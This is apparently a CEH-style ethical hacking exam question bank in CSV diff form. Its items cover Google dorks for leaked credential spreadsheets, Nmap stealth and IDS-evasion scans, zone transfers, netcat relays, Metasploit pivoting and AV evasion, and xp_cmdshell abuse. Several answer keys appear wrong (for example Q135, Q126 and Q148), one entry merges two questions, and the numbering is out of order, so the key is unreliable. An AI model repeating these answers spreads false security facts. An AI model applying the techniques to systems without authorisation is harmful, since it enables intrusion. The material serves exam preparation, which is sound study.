+B. inurl: target.com filename:xls username password email
+C. domain: target.com archive:xls username password email
+D. site: target.com file:xls username password email
+","A
+",110
+"111. What tool should you use when you need to analyze extracted metadata from files you collected when you were in the initial stage of penetration test (information gathering)?
+A. Armitage (GUI that visualizes targets and recommends exploits)
+B. Dimitry (Deepmagic Information Gathering Tool)
+C. Metagoofil
+D. cdpsnarf (extract information from CDP packets)
+","C
+",111
+"112. What is the way to decide how a packet will move from an untrusted outside host to a protected inside that is behind a firewall, which permits the hacker to determine which ports are open and if the packets can pass through the packet-filtering of the firewall.
+Firewalking (Active reconnaissance technique, analyze IP packet responses to determine ACL filters and map networks)
+Session hijacking (exploit session to gain unauthorized access to information/service)
+Man-in-the-middle attack (secretly relays and alters the communication between two parties)
+Network sniffing (sniff out data flowing over computer network links in real time)
+","Firewalking (Active reconnaissance technique, analyze IP packet responses to determine ACL filters and map networks)
+",112
+"113. Firewalk has just completed the second phase (the scanning phase) and a technician receives the output shown below. What conclusions can be drawn based on these scan results?
+TCP port 21 – no response
+TCP port 22 – no response
+TCP port 23 – Time-to-live exceeded
+A. The firewall itself is blocking ports 21 through 23 and a service is listening on port 23 of the target host.
+B. The lack of response from ports 21 and 22 indicate that those services are not running on the destination server.
+C. The scan on port 23 passed through the filtering device. This indicates that port 23 was not blocked at the firewall.
+D. The scan on port 23 was able to make a connection to the destination host prompting the firewall to respond with a TTL error.
+","C
+",113
+"114. A penetration tester was hired to perform a penetration test for a bank. The tester began searching for IP ranges owned by the bank, performing lookups on the bank’s DNS servers, reading news articles online about the bank, watching what times the bank employees come into work and leave from work, searching the bank’s job postings (paying special attention to IT related jobs), and visiting the local dumpster for the bank’s corporate office. What phase of the penetration test is the tester currently in?
+A. Information reporting
+B. Vulnerability assessment
+C. Active information gathering
+D. Passive information gathering
+","D
+",114
+"115. Which of the following provides a security professional with most information about the system’s security posture?
+A. Wardriving, warchalking, social engineering
+B. Social engineering, company site browsing, tailgating
+C. Phishing, spamming, sending trojans
+D. Port scanning, banner grabbing, service identification
+","D
+",115
+"116. A Security Engineer at a medium-sized accounting firm has been tasked with discovering how much information can be obtained from the firm’s public facing web servers. The engineer decides to start by using netcat to port 80. The engineer receives this output: 
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/6
+Expires: Tue, 17 Jan 2011 01:41:33 GMT
+Date: Mon, 16 Jan 2011 01:41:33 GMT
+Content-Type: text/html
+Accept-Ranges: bytes
+Last-Modified: Wed, 28 Dec 2010 15:32:21 GMT
+ETag: “b0aac0542e25c31:89d”
+Content-Length: 7369
+Which of the following is an example of what the engineer performed?
+A. Banner grabbing
+B. Cross-site scripting
+C. SQL injection
+D. Whois database query
+","a
+",116
+"117. A hacker named Jack is trying to compromise a bankís computer system. He needs to know the operating system of that computer to launch further attacks.
+What process would help him?
+","Banner grabbing (“welcome” screen that shows system information)
+",117
+"118. An attacker tries to do banner grabbing on a remote web server and executes the following command.
+$ nmap -sV host.domain.com -p 80
+He gets the following output.
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-08 19:10 EST
+Nmap scan report for host.domain.com (108.61.158.211)
+Host is up (0.032s latency).
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/.Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
+What did the hacker accomplish?
+A. nmap can’t retrieve the version number of any running remote service.
+B. The hacker successfully completed the banner grabbing.
+C. The hacker should’ve used nmap -O host.domain.com.
+D. The hacker failed to do banner grabbing as he didn’t get the version of the Apache web server.
+","B
+",118
+"119. Which of the following open source tools would be the best choice to scan a network for potential targets?
+A. NMAP
+B. NIKTO
+C. CAIN
+D. John the Ripper
+","A
+",119
+"120. Which of the following resources does NMAP need to be used as a basic vulnerability scanner covering several vectors like SMB, HTTP and FTP?
+A. Metasploit scripting engine
+B. Nessus scripting engine
+C. NMAP scripting engine
+D. SAINT scripting engine
+","C
+",120
+"121. You are using NMAP to resolve domain names into IP addresses for a ping sweep later.
+Which of the following commands looks for IP addresses?
+A. >host -t a hackeddomain.com
+B. >host -t soa hackeddomain.com
+C. >host -t ns hackeddomain.com
+D. >host -t AXFR hackeddomain.com
+","A
+",121
+"122. Which of the following is an NMAP script that could help detect HTTP Methods such as GET, POST, HEAD, PUT, DELETE, TRACE?
+A. http-git
+B. http-headers
+C. http enum
+D. http-methods
+","D
+",122
+"123. You’re doing an internal security audit and you want to find out what ports are open on all the servers. What is the best way to find out?
+A. Scan servers with Nmap
+B. Physically go to each server
+C. Scan servers with MBSA
+D. Telent to every port on each server
+","A
+",123
+"124. NMAP -sn 192.168.11.200-215
+The NMAP command above performs which of the following?
+A. A ping scan
+B. A trace sweep
+C. An operating system detect
+D. A port scan
+","A
+",124
+"125. You are attempting to run an Nmap port scan on a web server. Which of the following commands would result in a scan of common ports with the least amount of noise in order to evade IDS?
+nmap -sT -O -T0 (T0 least noise, sT means TCP connect scan)
+","nmap -sT -O -T0 (T0 least noise, sT means TCP connect scan)
+",125
+"126. If you want to only scan fewer ports than the default scan using Nmap tool, which option would you use
+-r
+-F (Scan only those ports listed in nmap_services file)
+-sP (Ping scan)
+-P (Specify ports)
+","-P (Specify ports)
+",126
+"127. What would you enter if you wanted to perform a stealth scan using Nmap?
+","nmap –sS (sS means stealth scan)
+",127
+"128. Port scanning can be used as part of a technical assessment to determine network vulnerabilities. The TCP XMAS scan is used to identify listening ports on the targeted system. While doing a technical assessment to determine network vulnerabilities, you used the TCP XMAS scan. What would be the response of all open ports?
+A. The port will send an ACK
+B. The port will send a SYN
+C. The port will ignore the packets
+D. The port will send an RST
+","C
+",128
+"129. An attacker scans a host with the below command. Which three flags are set # nmap -sX host.domain.com
+This is Xmas scan. SYN and ACK flags are set.
+This is SYN scan. SYN flag is set.
+This is Xmas scan. URG, PUSH and FIN are set.
+This is ACK scan. ACK flag is set.
+","This is Xmas scan. URG, PUSH and FIN are set.
+",129
+"130. Which of the following will perform an Xmas scan using NMAP? (sX means Xmas)
+A. nmap -sA 192.168.1.254 (ACK Scan)
+B. nmap -sP 192.168.1.254 (Ping scan)
+C. nmap -sX 192.168.1.254
+D. nmap -sV 192.168.1.254 (Version detection)
+","C
+",130
+"131. What is the best Nmap command to use when you want to list all devices in the same network quickly after you successfully identified a server whose IP address is 10.10.0.5?
+A. nmap -T4 -F 10.10.0.0/24 (-F scan only those ports listed in nmap_services file)
+B. nmap -T4 -q 10.10.0.0/24
+C. nmap -T4 -O 10.10.0.0/24 (OS fingerprinting)
+D. nmap -T4 -r 10.10.1.0/24
+","A
+",131
+"132. Which Nmap option would you use if you were not concerned about being detected and wanted to perform a very fast scan
+-A
+-O
+-T5 (0-5 speed template from slow and stealthy to fast and obvious)
+-T0
+","-T5 (0-5 speed template from slow and stealthy to fast and obvious)
+",132
+"133. A security engineer is attempting to map a company’s internal network. The engineer enters in the following NMAP command:
+NMAP –n –sS –P0 –p 80 ***.***.**.**
+What type of scan is this?
+A. Quick scan
+B. Intense scan
+C. Stealth scan
+D. Comprehensive scan
+","C
+",133
+"134. A hacker is attempting to see which IP addresses are currently active on a network. Which NMAP switch would the hacker use?
+A. –sO (IP Protocol Scans)
+B. –sP (Ping scan)
+C. –sS (Stealth scan)
+D. –sU (UDP scan)
+","B
+",134
+"135. A hacker is attempting to see which ports have been left open on a network. Which NMAP switch would the hacker use?
+A. -sO
+B. -sP
+C. -sS
+D. –sU
+","A
+",135
+"136. Which of the following parameters enables NMAP’s operating system detection feature?
+A. NMAP –sV (Version Detection)
+B. NMAP -oS
+C. NMAP -sR
+D. NMAP –O (OS fingerprinting)
+","D
+",136
+"137. What results will the following command yield: ‘NMAP -sS -O -p 123-153 192.168.100.3’?
+A. A stealth scan, opening port 123 and 153
+B. A stealth scan, checking open ports 123 to 153
+C. A stealth scan, checking all open ports excluding ports 123 to 153
+D. A stealth scan, determine operating system, and scanning ports 123 to 153
+","D
+",137
+"138. Which NMAP command combination would let a tester scan every TCP port from a class C network that is blocking ICMP with fingerprinting and service detection?
+A. NMAP -PN -A -O -sS 192.168.2.0/24
+B. NMAP -P0 -A -O -p1-65535 192.168.0/24
+C. NMAP -P0 -A -sT -p0-65535 192.168.0/16
+D. NMAP -PN -O -sS -p 1-1024 192.168.0/8
+","B
+",138
+"139. Which of the following Nmap commands will produce the following output?
+Output: Starting Nmap 6.47 (http://nmap.org ) at 2015-05-26 12:50 EDT
+Nmap scan report for 192.168.1.1
+Host is up (0.00042s latency).
+Not shown: 65530 open|filtered ports, 65529 filtered ports
+PORT STATE SERVICE
+111/tcp open rpcbind
+999/tcp open garcon
+1017/tcp open unknown
+1021/tcp open exp1
+1023/tcp open netvenuechat
+2049/tcp open nfs
+17501/tcp open unknown
+111/udp open rpcbind
+123/udp open ntp
+137/udp open netbios-ns
+2049/udp open nfs
+5353/udp open zeroconf
+17501/udp open|filtered unknown
+51857/udp open|filtered unknown
+54358/udp open|filtered unknown
+56228/udp open|filtered unknown
+57598/udp open|filtered unknown
+59488/udp open|filtered unknown
+60027/udp open|filtered unknown
+A. nmap -sN -Ps -T4 192.168.1.1
+B. nmap -sT -sX -Pn -p 1-65535 192.168.1.1
+C. nmap -sS -Pn 192.168.1.1
+D. nmap -sS -sU -Pn -p 1-65535 192.168.1.1
+","D
+",139
+"140. Which NMAP feature can a tester implement or adjust while scanning for open ports to avoid detection by the network’s IDS?
+A. Timing options to slow the speed that the port scan is conducted
+B. Fingerprinting to identify which operating systems are running on the network
+C. ICMP ping sweep to determine which hosts on the network are not available
+D. Traceroute to control the path of the packets sent during the scan
+","A
+",140
+"141. Emil uses nmap to scan two hosts using this command.
+nmap -sS -T4 -O 192.168.99.1 192.168.99.7
+He receives this output:Nmap scan report for 192.168.99.1
+Host is up (0.00082s latency).
+Not shown: 994 filtered ports
+PORT STATE SERVICE
+21/tcp open ftp
+23/tcp open telnet
+53/tcp open domain
+80/tcp open http
+161/tcp closed snmp
+MAC Address: B0:75:D5:33:57:74 (ZTE)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 – 2.6.33
+Network Distance: 1 hop
+Nmap scan report for 192.168.99.7
+Host is up (0.000047s latency).
+All 1000 scanned ports on 192.168.99.7 are closed
+Too many fingerprints match this host to give specific OS details
+Network Distance: 0 hops
+What is his conclusion?
+A. Host 192.168.99.7 is an iPad.
+B. He performed a SYN scan and OS scan on hosts 192.168.99.1 and 192.168.99.7.
+C. Host 192.168.99.1 is the host that he launched the scan from.
+D. Host 192.168.99.7 is down.
+","B
+",141
+"142. Which of the following tools will scan a network to perform vulnerability checks and compliance auditing?
+A. NMAP
+B. Metasploit
+C. Nessus
+D. BeEF
+","C
+",142
+"143. Your company was hired by a small healthcare provider to perform a technical assessment on the network. What is the best approach for discovering vulnerabilities on a Windows-based computer?
+A. Use a scan tool like Nessus
+B. Use the built-in Windows Update tool
+C. Check MITRE.org for the latest list of CVE findings
+D. Create a disk image of a clean Windows installation
+","A
+",143
+"144. On a Linux device, which of the following commands will start the Nessus client in the background so that the Nessus server can be configured?
+A. nessus +
+B. nessus *s
+C. nessus &
+D. nessus –d
+","C
+",144
+"145. Which of the following settings enables Nessus to detect when it is sending too many packets and the network pipe is approaching capacity?
+A. Netstat WMI Scan
+B. Silent Dependencies
+C. Consider unscanned ports as closed
+D. Reduce parallel connections on congestion
+","D
+",145
+"146. You want to analyze packets on your wireless network. Which program would you use?
+A. Wireshark with Airpcap
+B. Airsnort with Airpcap
+C. Wireshark with Winpcap
+D. Ethereal with Winpcap
+","A
+",146
+"148. The network administrator contacts you and tells you that she noticed the temperature on the internal wireless router increases by more than 20% during weekend hours when the office was closed. She asks you to investigate the issue because she is busy dealing with a big conference and she doesn’t have time to perform the task.
+What tool can you use to view the network traffic being sent and received by the wireless router?
+A. Wireshark
+B. Nessus
+C. Netcat
+D. Netstat
+","B
+",148
+"149. Which of the following problems can be solved by using Wireshark?
+A. Tracking version changes of source code
+B. Checking creation dates on all webpages on a server
+C. Resetting the administrator password on multiple systems
+D. Troubleshooting communication resets between two systems
+","D
+",149
+"150. When using Wireshark to acquire packet capture on a network, which device would enable the capture of all traffic on the wire?
+A. Network tap
+B. Layer 3 switch
+C. Network bridge
+D. Application firewall
+","A
+",150
+"151. You are a Network Security Officer. You have two machines. The first machine (192.168.0.99) has snort installed, and the second machine (192.168.0.150) has kiwi syslog installed. You perform a syn scan in your network, and you notice that kiwi syslog is not receiving the alert message from snort. You decide to run wireshark in the snort machine to check if the messages are going to the kiwi syslog machine. What wireshark filter will show the connections from the snort machine to kiwi syslog machine?
+A. tcp.dstport==514 && ip.dst==192.168.0.150
+B. tcp.srcport==514 && ip.src==192.168.0.99
+C. tcp.dstport==514 && ip.dst==192.168.0.0/16
+D. tcp.srcport==514 && ip.src==192.168.150
+","A
+",151
+"152. What is the correct PCAP filter to capture all TCP traffic going to or from host 192.168.0.125 on port 25?
+A. tcp.src == 25 and ip.host == 192.168.0.125
+B. host 192.168.0.125:25
+C. port 25 and host 192.168.0.125
+D. tcp.port == 25 and ip.host == 192.168.0.125
+","D
+",152
+"153. As an Ethical Hacker you are capturing traffic from your customer network with Wireshark and you need to find and verify just SMTP traffic. What command in Wireshark will help you to find this kind of traffic?
+A. request smtp 25
+B. tcp.port eq 25
+C. smtp port
+D. tcp.contains port 25
+","B
+",153
+"154. Which of the following is considered an exploit framework and has the ability to perform automated attacks on services, ports, applications and unpatched security flaws in a computer system?
+Maltego
+Metasploit
+Nessus
+Wireshark
+","Metasploit
+",154
+"155. Which Metasploit Framework tool can help penetration tester for evading Anti-virus Systems?
+A. msfpayload
+B. msfcli
+C. msfencode
+D. msfd
+","C
+",155
+"156. A pentester is using Metasploit to exploit an FTP server and pivot to a LAN. How will the pentester pivot using Metasploit?
+A. Issue the pivot exploit and set the meterpreter.
+B. Reconfigure the network settings in the meterpreter.
+C. Set the payload to propagate through the meterpreter.
+D. Create a route statement in the meterpreter.
+","D
+",156
+"157. The establishment of a TCP connection involves a negotiation called 3 way handshake. What type of message sends the client to the server in order to begin this negotiation?
+A. RST
+B. ACK
+C. SYN-ACK
+D. SYN
+","D
+",157
+"158. What is the correct process for the TCP three-way handshake connection establishment and connection termination?
+A. Connection Establishment: FIN, ACK-FIN, ACK
+Connection Termination: SYN, SYN-ACK, ACK
+B. Connection Establishment: SYN, SYN-ACK, ACK
+Connection Termination: ACK, ACK-SYN, SYN
+C. Connection Establishment: ACK, ACK-SYN, SYN
+Connection Termination: FIN, ACK-FIN, ACK
+D. Connection Establishment: SYN, SYN-ACK, ACK
+Connection Termination: FIN, ACK-FIN, ACK
+","D
+",158
+"159. You have several plain-text firewall logs that you must review to evaluate network traffic. You know that in order to do fast, efficient searches of the logs you must use regular expressions. Which command-line utility are you most likely to use?
+A. Grep
+B. Notepad
+C. MS Excel
+D. Relational Database
+","A
+",159
+"160. TCP/IP stack fingerprinting is the passive collection of configuration attributes from a remote device during standard layer 4 network communications. Which of the following tools can be used for passive OS fingerprinting?
+A. nmap
+B. ping
+C. tracert
+D. tcpdump
+","D
+",160
+"161. Which of the following is a command line packet analyzer similar to GUI-based Wireshark?
+A. tcpdump
+B. nessus
+C. etherea
+D. Jack the ripper
+","A
+",161
+"162. Which technical characteristic do Ethereal/Wireshark, TCPDump, and Snort have in common?
+A. They are written in Java.
+B. They send alerts to security monitors.
+C. They use the same packet analysis engine.
+D. They use the same packet capture utility.
+","D
+",162
+"163. Pentest results indicate that voice over IP traffic is traversing a network. Which of the following tools will decode a packet capture and extract the voice conversations?
+A. Cain
+B. John the Ripper
+C. Nikto
+D. Hping
+","A
+",163
+"164. Which of the following scanning tools is specifically designed to find potential exploits in Microsoft Windows products?
+A. Microsoft Security Baseline Analyzer
+B. Retina
+C. Core Impact
+D. Microsoft Baseline Security Analyzer
+","D
+",164
+"165. ICMP ping and ping sweeps are used to check for active systems and to check
+A. if ICMP ping traverses a firewall.
+B. the route that the ICMP ping took.
+C. the location of the switchport in relation to the ICMP ping.
+D. the number of hops an ICMP ping takes to reach a destination.
+","A
+",165
+"166. An attacker is using nmap to do a ping sweep and a port scanning in a subnet of 254 addresses. In which order should he perform these steps?
+A. The sequence does not matter. Both steps have to be performed against all hosts.
+B. First the port scan to identify interesting services and then the ping sweep to find hosts responding to icmp echo requests.
+C. First the ping sweep to identify live hosts and then the port scan on the live hosts. This way he saves time.
+D. The port scan alone is adequate. This way he saves time.
+","C
+",166
+"167. If a tester is attempting to ping a target that exists but receives no response or a response that states the destination is unreachable, ICMP may be disabled and the network may be using TCP. Which other option could the tester use to get a response from a host using TCP?
+TCP ping
+Traceroute
+Broadcast ping
+Hping
+","Hping
+",167
+"168. You want to do an ICMP scan on a remote computer using hping2. What is the proper syntax?
+A. hping2 host.domain.com
+B. hping2 –set-ICMP host.domain.com
+C. hping2 -i host.domain.com
+D. hping2 -1 host.domain.com
+","D
+",168
+"169. Which of the following scanning method splits the TCP header into several packets and makes it difficult for packet filters to detect the purpose of the packet
+ACK flag probe scanning
+IPID scanning
+SYNFIN scanning using IP fragments
+ICMP Echo scanning
+","SYNFIN scanning using IP fragments
+",169
+"453. SOAP services use which technology to format information?
+A. SATA
+B. PCI
+C. XML
+D. ISDN
+","C
+",453
+"170. You are a Penetration Tester and are assigned to scan a server. You need to use a scanning technique wherein the TCP Header is split into many packets so that it becomes difficult to detect what the packets are meant for.
+Which of the below scanning technique will you use?
+A. ACK flag scanning
+B. TCP Scanning
+C. IP Fragment Scanning
+D. Inverse TCP flag scanning
+","C
+",170
+"171. Which is the first step followed by Vulnerability Scanners for scanning a network?
+Firewall detection
+Checking if the remote host is alive
+OS Detection
+TCP UDP Port scanning
+","Checking if the remote host is alive
+",171
+"172. The following is part of a log file taken from the machine on the network with the IP address of 192.168.1.106:
+Time:Mar 13 17:30:15 Port:20 Source:192.168.1.103 Destination:192.168.1.106 Protocol:TCP
+Time:Mar 13 17:30:17 Port:21 Source:192.168.1.103 Destination:192.168.1.106 Protocol:TCP
+Time:Mar 13 17:30:19 Port:22 Source:192.168.1.103 Destination:192.168.1.106 Protocol:TCP
+Time:Mar 13 17:30:21 Port:23 Source:192.168.1.103 Destination:192.168.1.106 Protocol:TCP
+Time:Mar 13 17:30:22 Port:25 Source:192.168.1.103 Destination:192.168.1.106
+Protocol:TCP
+Time:Mar 13 17:30:23 Port:80 Source:192.168.1.103 Destination:192.168.1.106 Protocol:TCP
+Time:Mar 13 17:30:30 Port:443 Source:192.168.1.103 Destination:192.168.1.106 Protocol:TCP
+What type of activity has been logged?
+A. Port scan targeting 192.168.1.106
+B. Teardrop attack targeting 192.168.1.106
+C. Denial of service attack targeting 192.168.1.103
+D. Port scan targeting 192.168.1.103
+Suppose you’ve gained access to your client’s hybrid network. On which port should you listen to in order to know which Microsoft Windows workstations has its file sharing enabled?
+A. 1433
+B. 161
+C. 445
+D. 3389
+","D & C
+",172
+"173. You perform a scan of your company’s network and discover that TCP port 123 is open. What services by default run on TCP port 123
+DNS
+POP3
+Network Time Protocol
+Telnet
+","Network Time Protocol
+",173
+"174. You are the Network Admin, and you get a complaint that some of the websites are no longer accessible. You try to ping the servers and find them to be reachable. Then you type the IP address and then try on the browser, and find it to be accessible. But they are not accessible when you try using the URL. What may be the problem?
+","Traffic is Blocked on UDP Port 53 (Port 53 is for DNS)
+",174
+"175. Which protocol and port number might be needed in order to send log messages to a log analysis tool that resides behind a firewall?
+A. UDP 123
+B. UDP 541
+C. UDP 514
+D. UDP 415
+","C
+",175
+"176. Identify the UDP port that Network Time Protocol (NTP) uses as its primary means of communication?
+113
+123
+161
+69
+","123
+",176
+"177. An NMAP scan of a server shows port 25 is open. What risk could this pose?
+A. Open printer sharing
+B. Web portal data leak
+C. Clear text authentication
+D. Active mail relay
+","D
+",177
+"178. An NMAP scan of a server shows port 69 is open. What risk could this pose?
+A. Unauthenticated access
+B. Weak SSL version
+C. Cleartext login
+D. Web portal data leak
+","A
+",178
+"179. A penetration tester is conducting a port scan on a specific host. The tester found several ports opened that were confusing in concluding the Operating System (OS) version installed. Considering the NMAP result below, which of the following is likely to be installed on the target machine by the OS?
+Starting NMAP 5.21 at 2011-03-15 11:06
+NMAP scan report for 172.16.40.65
+Host is up (1.00s latency).
+Not shown: 993 closed ports
+PORT STATE SERVICE 21/tcp open
+ftp 23/tcp open
+telnet 80/tcp open
+http 139/tcp open
+netbios-ssn 515/tcp open
+631/tcp open
+ipp 9100/tcp open
+MAC Address: 00:00:48:0D:EE:8
+The host is likely a printer.
+The host is likely a Windows machine.
+The host is likely a Linux machine.
+The host is likely a router.
+","The host is likely a printer.
+",179
+"180. From the two screenshots below, which of the following is occurring?
+First one:
+1 [10.0.0.253]# nmap -sP 10.0.0.0/24
+2
+3 Starting Nmap
+5 Host 10.0.0.1 appears to be up.
+6 MAC Address: 00:09:5B:29:FD:96 (Netgear)
+7 Host 10.0.0.2 appears to be up.
+8 MAC Address: 00:0F:B5:96:38:5D (Netgear)
+9 Host 10.0.0.4 appears to be up.
+10 Host 10.0.0.5 appears to be up.
+11 MAC Address: 00:14:2A:B1:1E:2E (Elitegroup Computer System Co.)
+12 Nmap finished: 256 IP addresses (4 hosts up) scanned in 5.399 seconds
+Second one:
+1 [10.0.0.252]# nmap -sO 10.0.0.2
+2
+3 Starting Nmap 4.01 at 2006-07-14 12:56 BST
+4 Interesting protocols on 10.0.0.2:
+5 (The 251 protocols scanned but not shown below are
+6 in state: closed)
+7 PROTOCOL STATE SERVICE
+8 1 open icmp
+9 2 open|filtered igmp
+10 6 open tcp
+11 17 open udp
+12 255 open|filtered unknown
+13
+14 Nmap finished: 1 IP address (1 host up) scanned in
+15 1.259 seconds
+A. 10.0.0.253 is performing an IP scan against 10.0.0.0/24, 10.0.0.252 is performing a port scan against 10.0.0.2.
+B. 10.0.0.253 is performing an IP scan against 10.0.0.2, 10.0.0.252 is performing a port scan against 10.0.0.2.
+C. 10.0.0.2 is performing an IP scan against 10.0.0.0/24, 10.0.0.252 is performing a port scan against 10.0.0.2.
+D. 10.0.0.252 is performing an IP scan against 10.0.0.2, 10.0.0.252 is performing a port scan against 10.0.0.2. 
+","A
+",180
+"181. Based on the below log, which of the following sentences are true?
+*Mar 1, 2016, 7:33:28 AM 10.240.250.23 – 54373 10.249.253.15 – 22 tcp_ip
+Application is SSH and 10.240.250.23 is the server and 10.249.253.15 is the client.
+SSH communications are encrypted it’s impossible to know who is the client or the server.
+Application is FTP and 10.240.250.23 is the client and 10.249.253.15 is the server.
+Application is SSH and 10.240.250.23 is the client and 10.249.253.15 is the server.
+","Application is SSH and 10.240.250.23 is the client and 10.249.253.15 is the server.
+",181
+"182. A company has five different subnets: 192.168.1.0, 192.168.2.0, 192.168.3.0, 192.168.4.0 and 192.168.5.0. How can NMAP be used to scan these adjacent Class C networks?
+A. NMAP -P 192.168.1-5*
+B. NMAP -P 192.168.0.0/16 (B can work too)
+C. NMAP -P 192.168.1.0, 2.0, 3.0, 4.0, 5.0
+D. NMAP -P 192.168.1/17
+","A
+",182
+"183. What is the broadcast address for the subnet 190.86.168.0/22?
+A. 190.86.168.255
+B. 190.86.255.255
+C. 190.86.171.255
+D. 190.86.169.255
+","C 1010 10XX -> 1010 1011
+",183
+"184. While checking the settings on the internet browser, a technician finds that the proxy server settings have been checked and a computer is trying to use itself as a proxy server. What specific octet within the subnet does the technician see?
+A. 10.10.10.10
+B. 127.0.0.1
+C. 192.168.1.1
+D. 192.168.168.168
+","B
+",184
+"200. What statement is true regarding LM hashes?
+A. LM hashes consist in 48 hexadecimal characters.
+B. LM hashes are based on AES128 cryptographic standard.
+C. Uppercase characters in the password are converted to lowercase.
+D. LM hashes are not generated when the password length exceeds 15 characters.
+","D
+",200
+"220. Which of the following programs is usually targeted at Microsoft Office products?
+A. Polymorphic virus
+B. Multipart virus
+C. Stealth virus
+D. Macro virus
+","D
+",220
+"185. You are an Ethical Hacker who is auditing the ABC company. When you verify the NOC one of the machines has 2 connections, one wired and the other wireless. When you verify the configuration of this Windows system you find two static routes.
+route add 10.0.0.0 mask 255.0.0.0 10.0.0.1
+route add 0.0.0.0 mask 255.0.0.0 199.168.0.1
+What is the main purpose of those static routes?
+A. Both static routes indicate that the traffic is external with different gateway.
+B. The first static route indicates that the internal traffic will use an external gateway and the second static route indicates that the traffic will be rerouted.
+C. Both static routes indicate that the traffic is internal with different gateway.
+D. The first static route indicates that the internal addresses are using the internal gateway and the second static route indicates that all the traffic that is not internal must go to an external gateway.
+","D
+",185
+"186. The network in ABC company is using the network address 192.168.1.64 with mask 255.255.255.192. In the network the servers are in the addresses 192.168.1.122,192.168.1.123 and 192.168.1.124.
+An attacker is trying to find those servers but he cannot see them in his scanning. The command he is using is: nmap 192.168.1.64/28
+Why he cannot see the servers?
+He needs to add the command “”ip address”” just before the IP address
+He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range
+The network must be down and the nmap command and IP address are ok
+He needs to change the address to 192.168.1.0 with the same mask
+","He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range
+",186
+"187. You’ve just gained root access to a Centos 6 server after days of trying. What tool should you use to maintain access?
+A. Disable Key Services
+B. Create User Account
+C. Download and Install Netcat
+D. Disable IPTables
+","C
+",187
+"188. A company has publicly hosted web applications and an internal Intranet protected by a firewall. Which technique will help protect against enumeration?
+A. Reject all invalid email received via SMTP.
+B. Allow full DNS zone transfers.
+C. Remove A records for internal hosts.
+D. Enable null session pipes.
+","C
+",188
+"189. Which of the following tools is used by pen testers and analysts specifically to analyze links between data using link analysis and graphs?
+A. Metasploit
+B. Wireshark
+C. Maltego
+D. Cain & Abel
+","C
+",189
+"190. Which of the following tools is used to analyze the files produced by several packet-capture programs such as tcpdump, WinDump, Wireshark, and EtherPeek?
+A. tcptrace
+B. tcptraceroute (A command, not tool)
+C. Nessus
+D. OpenVAS
+","A
+",190
+"191. What is the outcome of the comm”nc -l -p 2222 | nc 10.1.0.43 1234??
+A. Netcat will listen on the 10.1.0.43 interface for 1234 seconds on port 2222.
+B. Netcat will listen on port 2222 and output anything received to a remote connection on 10.1.0.43 port 1234.
+C. Netcat will listen for a connection from 10.1.0.43 on port 1234 and output anything received to port 2222.
+D. Netcat will listen on port 2222 and then output anything received to local interface 10.1.0.43.
+","B
+",191
+"192. Look at the following output. What did the hacker accomplish?
+; <<>> DiG 9.7.-P1 <<>> axfr domam.com @192.168.1.105
+;; global options: +cmd
+domain.com. 3600 IN SOA srv1.domain.com. hostsrv1.domain.com. 131 900 600 86400 3600
+domain.com. 600 IN A 192.168.1.102
+domain.com. 600 IN A 192.168.1.105
+domain.com. 3600 IN NS srv1.domain.com.
+domain.com. 3600 IN NS srv2.domain.com.
+vpn.domain.com. 3600 IN A 192.168.1.1
+server.domain.com. 3600 IN A 192.168.1.3
+office.domain.com. 3600 IN A 192.168.1.4
+remote.domain.com. 3600 IN A 192.168. 1.48
+support.domain.com. 3600 IN A 192.168.1.47
+ns1.domain.com. 3600 IN A 192.168.1.41
+ns2.domain.com. 3600 IN A 192.168.1.42
+ns3.domain.com. 3600 IN A 192.168.1.34
+ns4.domain.com. 3600 IN A 192.168.1.45
+srv1.domain.com. 3600 IN A 192.168.1.102
+srv2.domain.com. 1200 IN A 192.168.1.105
+domain.com. 3600 INSOA srv1.domain.com. hostsrv1.domain.com. 131 900 600 86400 3600;; Query time: 269 msec
+;; SERVER: 192.168.1.105#53(192.168.1.105)
+;; WHEN: Sun Aug 11 20:07:59 2013
+;; XFR size: 65 records (messages 65, bytes 4501)
+A. The hacker used whois to gather publicly available records for the domain.
+B. The hacker used the “fierce” tool to brute force the list of available domains.
+C. The hacker listed DNS records on his own domain.
+D. The hacker successfully transferred the zone and enumerated the hosts.
+","D
+",192
+"193. Which command lets a tester enumerate alive systems in a class C network via ICMP using native Windows tools?
+A. ping 192.168.2.
+B. ping 192.168.2.255
+C. for %V in (1 1 255) do PING 192.168.2.%V
+D. for /L %V in (1 1 254) do PING -n 1 192.168.2.%V | FIND /I “Reply”
+","D
+",193
+"194. During a penetration test, a tester finds a target that is running MS SQL 2000 with default credentials. The tester assumes that the service is running with Local System account. How can this weakness be exploited to access the system?
+A. Using the Metasploit psexec module setting the SA / Admin credential
+B. Invoking the stored procedure xp_shell to spawn a Windows command shell
+C. Invoking the stored procedure cmd_shell to spawn a Windows command shell
+D. Invoking the stored procedure xp_cmdshell to spawn a Windows command shell
+","D
+",194
+"195. Which of the following techniques will identify if computer files have been changed?
+A. Network sniffing
+B. Permission sets
+C. Integrity checking hashes
+D. Firewall alerts
+","C
+",195
+"196. Which specific element of security testing is being assured by using hash?
+A. Authentication
+B. Integrity
+C. Confidentiality
+D. Availability
+","B
+",196
+"197. The company ABC recently contract a new accountant. The accountant will be working with the financial statements. Those financial statements need to be approved by the CFO and then they will be sent to the accountant but the CFO is worried because he wants to be sure that the information sent to the accountant was not modified once he approved it. What of the following options can be useful to ensure the integrity of the data?
+The CFO can use a hash algorithm in the document once he approved the financial statements
+The document can be sent to the accountant using an exclusive USB for that document
+The financial statements can be sent twice, one by email and the other delivered in USB and the accountant can compare both to be sure is the same document
+The CFO can use an excel file with a password
+","The CFO can use a hash algorithm in the document once he approved the financial statements
+",197
+"198. Which of the following is a hashing algorithm?
+A. MD5
+B. PGP
+C. DES
+D. ROT13
+","A
+",198
+"199. LM hash is a compromised password hashing function. Which of the following parameters describe LM Hash:?
+I – The maximum password length is 14 characters.
+II – There are no distinctions between uppercase and lowercase.
+III – It’s a simple algorithm, so 10,000,000 hashes can be generated per second.
+A. I
+B. I, II, and III
+C. II
+D. I and II
+","B
+",199
